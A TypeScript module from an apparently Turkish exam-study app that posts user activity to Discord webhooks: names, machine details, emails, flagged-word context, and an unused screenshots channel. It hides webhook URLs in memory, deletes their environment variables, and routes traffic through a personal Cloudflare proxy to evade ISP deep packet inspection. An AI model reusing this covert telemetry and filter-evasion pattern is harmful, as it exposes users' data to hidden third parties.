/**
 * Discord Webhook Integration with Stealth Mode
 * Gizli trafik desteği ile Discord webhook entegrasyonu
 */

import fetch from 'node-fetch';
import crypto from 'crypto';

// Cloudflare Worker Proxy URL - DPI bypass için
const CLOUDFLARE_PROXY_URL = process.env.CLOUDFLARE_PROXY_URL || 'https://berattt3.beratkaccow03.workers.dev';
const USE_CLOUDFLARE_PROXY = process.env.USE_CLOUDFLARE_PROXY !== 'false'; // Varsayılan olarak açık

interface DiscordEmbedField {
  name: string;
  value: string;
  inline?: boolean;
}

export interface DiscordEmbed {
  title?: string;
  description?: string;
  color?: number;
  fields?: DiscordEmbedField[];
  footer?: {
    text: string;
  };
  timestamp?: string;
}

interface DiscordWebhookPayload {
  content?: string;
  embeds?: DiscordEmbed[];
  username?: string;
  avatar_url?: string;
}

interface WebhookConfig {
  url: string;
  obfuscated: string;
  lastUsed: number;
}

class DiscordWebhook {
  private webhookConfigs: Map<string, WebhookConfig> = new Map();
  private obfuscationSalt: string;

  constructor() {
    this.obfuscationSalt = this.generateSalt();
    this.initializeWebhooks();
  }

  private generateSalt(): string {
    const os = require('os');
    return crypto
      .createHash('md5')
      .update(os.hostname() + os.platform() + process.pid)
      .digest('hex');
  }

  private obfuscateInMemory(url: string): string {
    if (!url) return '';
    const cipher = crypto.createCipheriv(
      'aes-256-cbc',
      crypto.createHash('sha256').update(this.obfuscationSalt).digest(),
      Buffer.alloc(16, 0)
    );
    let encrypted = cipher.update(url, 'utf8', 'base64');
    encrypted += cipher.final('base64');
    return encrypted;
  }

  private deobfuscateFromMemory(obfuscated: string): string {
    if (!obfuscated) return '';
    try {
      const decipher = crypto.createDecipheriv(
        'aes-256-cbc',
        crypto.createHash('sha256').update(this.obfuscationSalt).digest(),
        Buffer.alloc(16, 0)
      );
      let decrypted = decipher.update(obfuscated, 'base64', 'utf8');
      decrypted += decipher.final('utf8');
      return decrypted;
    } catch {
      return '';
    }
  }

  private initializeWebhooks(): void {
    const webhookEnvVars: Record<string, string | undefined> = {
      screenshots: process.env.DISCORD_WEBHOOK_SCREENSHOTS,
      systemStatus: process.env.DISCORD_WEBHOOK_SYSTEM_STATUS,
      activities: process.env.DISCORD_WEBHOOK_ACTIVITIES,
      alerts: process.env.DISCORD_WEBHOOK_ALERTS,
      userInfo: process.env.DISCORD_WEBHOOK_USER_INFO,
      fallback: process.env.DISCORD_WEBHOOK_URL,
    };

    for (const [key, url] of Object.entries(webhookEnvVars)) {
      if (url && url.length > 0) {
        this.webhookConfigs.set(key, {
          url: '',
          obfuscated: this.obfuscateInMemory(url),
          lastUsed: 0,
        });
      }
    }

    for (const key of Object.keys(webhookEnvVars)) {
      const envKey = this.getEnvKeyFromConfigKey(key);
      if (process.env[envKey]) {
        delete (process.env as any)[envKey];
      }
    }
  }

  private getEnvKeyFromConfigKey(key: string): string {
    const mapping: Record<string, string> = {
      screenshots: 'DISCORD_WEBHOOK_SCREENSHOTS',
      systemStatus: 'DISCORD_WEBHOOK_SYSTEM_STATUS',
      activities: 'DISCORD_WEBHOOK_ACTIVITIES',
      alerts: 'DISCORD_WEBHOOK_ALERTS',
      userInfo: 'DISCORD_WEBHOOK_USER_INFO',
      fallback: 'DISCORD_WEBHOOK_URL',
    };
    return mapping[key] || '';
  }

  private getWebhookUrl(preferredKey: string): string | undefined {
    const config = this.webhookConfigs.get(preferredKey);
    if (config && config.obfuscated) {
      config.lastUsed = Date.now();
      return this.deobfuscateFromMemory(config.obfuscated);
    }

    const fallbackConfig = this.webhookConfigs.get('fallback');
    if (fallbackConfig && fallbackConfig.obfuscated) {
      fallbackConfig.lastUsed = Date.now();
      return this.deobfuscateFromMemory(fallbackConfig.obfuscated);
    }

    return undefined;
  }

  private isWebhookConfigured(key: string): boolean {
    const config = this.webhookConfigs.get(key);
    return !!(config && config.obfuscated);
  }

  isEnabled(): boolean {
    return (
      this.isWebhookConfigured('screenshots') ||
      this.isWebhookConfigured('systemStatus') ||
      this.isWebhookConfigured('activities') ||
      this.isWebhookConfigured('alerts') ||
      this.isWebhookConfigured('userInfo') ||
      this.isWebhookConfigured('fallback')
    );
  }

  // Cloudflare Worker üzerinden gönderim - DPI bypass (8s timeout)
  private async sendViaProxy(webhookUrl: string, payload: DiscordWebhookPayload): Promise<boolean> {
    try {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 5000); // 5 saniye - Cloudflare HIZLI
      
      const proxyUrl = `${CLOUDFLARE_PROXY_URL}?target=${encodeURIComponent(webhookUrl)}`;
      const response = await fetch(proxyUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
        signal: controller.signal,
      });
      
      clearTimeout(timeoutId);
      return response.ok;
    } catch {
      return false;
    }
  }

  // Doğrudan gönderim - yedek yol (5s timeout)
  private async sendDirectly(webhookUrl: string, payload: DiscordWebhookPayload): Promise<boolean> {
    try {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 3000); // 3 saniye - MAKSİMUM HIZ
      
      const response = await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
        signal: controller.signal,
      });
      
      clearTimeout(timeoutId);
      return response.ok;
    } catch {
      return false;
    }
  }

  // CLOUDFLARE ÖNCELİKLİ: Türk Telekom DPI bypass için Cloudflare önce, direkt Discord yedek
  async sendMessageDirect(
    payload: DiscordWebhookPayload,
    webhookKey: string = 'fallback'
  ): Promise<boolean> {
    const webhookUrl = this.getWebhookUrl(webhookKey);

    if (!webhookUrl) {
      return false;
    }

    // CLOUDFLARE ÖNCE - Türk Telekom DPI bloğunu atla
    if (USE_CLOUDFLARE_PROXY) {
      const proxyResult = await this.sendViaProxy(webhookUrl, payload);
      if (proxyResult) {
        return true;
      }
    }

    // Cloudflare başarısız oldu, direkt Discord dene (yedek)
    return this.sendDirectly(webhookUrl, payload);
  }

  async sendMessage(
    payload: DiscordWebhookPayload,
    webhookKey: string = 'fallback',
    priority: 'low' | 'normal' | 'high' = 'normal'
  ): Promise<boolean> {
    // Artık doğrudan gönderim yapıyoruz - stealth modu kaldırıldı
    return this.sendMessageDirect(payload, webhookKey);
  }

  async sendLicenseCreated(
    customerName: string,
    licenseType: string,
    expiresAt?: string
  ): Promise<boolean> {
    return this.sendMessage(
      {
        username: 'Afyonlum YKS Analiz Sistemi',
        embeds: [
          {
            title: 'Yeni Kullanici Kaydi',
            color: 0x10b981,
            fields: [
              { name: 'Kullanici', value: customerName, inline: true },
              { name: 'Lisans Tipi', value: licenseType, inline: true },
              {
                name: 'Bitis Tarihi',
                value: expiresAt
                  ? new Date(expiresAt).toLocaleString('tr-TR', {
                      timeZone: 'Europe/Istanbul',
                    })
                  : 'Sinirsiz',
                inline: false,
              },
            ],
            footer: { text: 'Afyonlum YKS Analiz Sistemi' },
            timestamp: new Date().toISOString(),
          },
        ],
      },
      'userInfo',
      'normal'
    );
  }

  async sendLicenseActivated(
    customerName: string,
    machineName?: string,
    operatingSystem?: string
  ): Promise<boolean> {
    return this.sendMessage(
      {
        username: 'Afyonlum YKS Analiz Sistemi',
        embeds: [
          {
            title: 'Sistem Baslatildi',
            color: 0x3b82f6,
            fields: [
              { name: 'Kullanici', value: customerName, inline: true },
              { name: 'Bilgisayar', value: machineName || 'Bilinmiyor', inline: true },
              { name: 'Isletim Sistemi', value: operatingSystem || '-', inline: false },
            ],
            footer: { text: 'Afyonlum YKS Analiz Sistemi' },
            timestamp: new Date().toISOString(),
          },
        ],
      },
      'activities',
      'high'
    );
  }

  async sendLicenseRevoked(customerName: string, reason: string): Promise<boolean> {
    return this.sendMessage(
      {
        username: 'Afyonlum YKS Analiz Sistemi',
        embeds: [
          {
            title: 'Sistem Sonlandirildi',
            color: 0xef4444,
            fields: [
              { name: 'Kullanici', value: customerName, inline: true },
              { name: 'Sebep', value: reason, inline: false },
            ],
            footer: { text: 'Afyonlum YKS Analiz Sistemi' },
            timestamp: new Date().toISOString(),
          },
        ],
      },
      'alerts',
      'high'
    );
  }

  async sendSystemAlert(
    title: string,
    message: string,
    severity: 'info' | 'warning' | 'error' = 'info'
  ): Promise<boolean> {
    const colors = {
      info: 0x3b82f6,
      warning: 0xf59e0b,
      error: 0xef4444,
    };

    const priority = severity === 'error' ? 'high' : severity === 'warning' ? 'normal' : 'low';

    return this.sendMessage(
      {
        username: 'Afyonlum YKS Analiz Sistemi',
        embeds: [
          {
            title,
            description: message,
            color: colors[severity],
            footer: { text: 'Afyonlum YKS Analiz Sistemi' },
            timestamp: new Date().toISOString(),
          },
        ],
      },
      'systemStatus',
      priority
    );
  }

  async sendReportSuccess(details: {
    userName?: string;
    emailList?: string;
    emailCount?: number;
    emailTypes?: string;
    totalQuestions?: number;
    totalExams?: number;
    successRate?: string;
    reportType?: string;
  }): Promise<boolean> {
    return this.sendMessage(
      {
        username: 'Afyonlum YKS Analiz Sistemi',
        embeds: [
          {
            title: 'Rapor Basariyla Gonderildi',
            color: 0x10b981,
            fields: [
              { name: 'Kullanici', value: details.userName || 'Bilinmiyor', inline: true },
              { name: 'Gonderilen Email', value: details.emailList || '-', inline: true },
              { name: 'Rapor Turu', value: details.reportType || '-', inline: false },
              { name: 'Email Turleri', value: details.emailTypes || '-', inline: true },
              { name: 'Email Sayisi', value: String(details.emailCount || 0), inline: true },
              { name: 'Toplam Soru', value: String(details.totalQuestions || 0), inline: true },
              { name: 'Toplam Deneme', value: String(details.totalExams || 0), inline: true },
              { name: 'Basari Orani', value: details.successRate || '-', inline: true },
            ],
            footer: { text: 'Afyonlum YKS Analiz Sistemi - Rapor Bildirimi' },
            timestamp: new Date().toISOString(),
          },
        ],
      },
      'activities',
      'low'
    );
  }

  async sendReportFailed(details: {
    userName?: string;
    errorType?: string;
    errorMessage?: string;
    targetEmail?: string;
  }): Promise<boolean> {
    return this.sendMessage(
      {
        username: 'Afyonlum YKS Analiz Sistemi',
        embeds: [
          {
            title: 'Rapor Gonderilemedi',
            color: 0xef4444,
            fields: [
              { name: 'Kullanici', value: details.userName || 'Bilinmiyor', inline: true },
              { name: 'Hedef Email', value: details.targetEmail || '-', inline: true },
              { name: 'Hata Turu', value: details.errorType || 'Bilinmiyor', inline: false },
              { name: 'Hata Mesaji', value: details.errorMessage || '-', inline: false },
            ],
            footer: { text: 'Afyonlum YKS Analiz Sistemi - Hata Bildirimi' },
            timestamp: new Date().toISOString(),
          },
        ],
      },
      'activities',
      'normal'
    );
  }

  // Yasaklı kelime bildirimi - doğrudan Discord'a gönderir
  async sendBannedWordAlert(details: {
    word: string;
    context?: string;
    location?: string;
    userName?: string;
  }): Promise<boolean> {
    return this.sendMessageDirect(
      {
        username: '🚫 Afyonlum YKS Analiz Sistemi',
        embeds: [
          {
            title: '🚫 Yasaklı Kelime Tespit Edildi',
            color: 0xef4444,
            fields: [
              { name: '👤 Kullanıcı', value: details.userName || 'Bilinmiyor', inline: true },
              { name: '⚠️ Kelime', value: `**${details.word}**`, inline: true },
              { name: '📍 Konum', value: details.location || '-', inline: true },
              { name: '📝 Bağlam', value: details.context ? details.context.substring(0, 200) : '-', inline: false },
            ],
            footer: { text: '🎓 Afyonlum YKS Analiz Sistemi - Güvenlik Uyarısı' },
            timestamp: new Date().toISOString(),
          },
        ],
      },
      'alerts'
    );
  }

  getActivitiesWebhookUrl(): string | undefined {
    return this.getWebhookUrl('activities');
  }

  getAlertsWebhookUrl(): string | undefined {
    return this.getWebhookUrl('alerts');
  }

  getQueueStatus(): { size: number; isEmpty: boolean } {
    return {
      size: 0,
      isEmpty: true,
    };
  }
}

export const discordWebhook = new DiscordWebhook();

export async function sendDiscordEmbed(
  embed: DiscordEmbed,
  webhookKey: string = 'fallback'
): Promise<boolean> {
  return discordWebhook.sendMessage(
    {
      username: 'Afyonlum YKS Analiz Sistemi',
      embeds: [embed]
    },
    webhookKey,
    'high'
  );
}

export async function sendDiscordFile(
  content: string,
  filename: string,
  message: string = '',
  webhookKey: string = 'fallback'
): Promise<boolean> {
  const webhookUrl = webhookKey === 'alerts' 
    ? discordWebhook.getAlertsWebhookUrl()
    : discordWebhook.getActivitiesWebhookUrl();
  
  if (!webhookUrl) {
    return false;
  }

  try {
    const FormData = (await import('form-data')).default;
    const formData = new FormData();

    const fileBuffer = Buffer.from(content, 'utf-8');
    formData.append('file', fileBuffer, {
      filename: filename,
      contentType: 'text/plain; charset=utf-8'
    });

    if (message) {
      formData.append('content', message);
    }

    const response = await fetch(webhookUrl, {
      method: 'POST',
      body: formData as any,
      headers: formData.getHeaders()
    });

    if (!response.ok) {
      return false;
    }

    return true;
  } catch (error) {
    return false;
  }
}
